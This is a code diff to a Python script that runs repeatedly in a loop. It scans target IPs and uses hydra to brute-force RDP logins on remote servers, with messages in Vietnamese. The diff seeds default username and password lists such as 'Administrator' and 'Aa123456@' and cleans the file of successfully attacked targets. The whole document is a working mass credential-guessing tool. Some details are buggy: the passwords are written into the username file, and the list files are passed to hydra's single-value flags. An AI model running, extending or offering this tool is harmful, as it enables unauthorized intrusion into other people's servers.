@@ -4,8 +4,16 @@ import threading
 import os
 
 class BruteForceVPS:
-    def __init__(self, username="John", password="12345", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
+    def __init__(self, username="username.txt", password="password.txt", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
         print(f"Lời nhắc: các mục tiêu đã tấn công thành công được lưu vào tệp {hydra_output}")
+        if os.path.exists(username) == False:
+            with open(file=username, mode="a", encoding="utf-8") as file:
+                for user in ["John\n", "Administrator\n", "Aaron"]:
+                    file.write(user)
+        if os.path.exists(password) == False:
+            with open(file=username, mode="a", encoding="utf-8") as file:
+                for user in ["12345\n", "Aa123456\n", "Aa123456@"]:
+                    file.write(user)
         self.username = username
         self.password = password
         self.hydra_output = hydra_output
@@ -51,6 +59,20 @@ class BruteForceVPS:
     def hydra_attack(self, hydra_thread=1):
         os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
     
+    def clean_hydra_output(self):
+        with open(file=self.hydra_output, mode="r", encoding="utf-8") as file:
+            hydra_outut = file.read().splitlines()
+        clear_except = []
+        for o in hydra_outut:
+            if o.split()[0] not in "#":
+                clear_except.append(f"{o}\n")
+        
+        with open(file=self.hydra_output, mode="w", encoding="utf-8") as file:
+            file.write("")
+
+        with open(file=self.hydra_output, mode="a", encoding="utf-8") as file:
+            for tar_op in clear_except:
+                file.write(tar_op)
 
     def run(self, num_thread):
         while True:
@@ -60,6 +82,12 @@ class BruteForceVPS:
             self.multi_thread_scan(thread_num=num_thread)
             print("bắt đầu tấn công")
             self.hydra_attack()
+            if os.path.exists(self.hydra_output) == True:
+                try:
+                    self.clean_hydra_output()
+                except Exception as e:
+                    print(f"lỗi ở xử lý tệp {self.hydra_output} : {e}")
+                    continue
 
 num_thread = int(input("nhập số luồng : "))
 brute = BruteForceVPS()
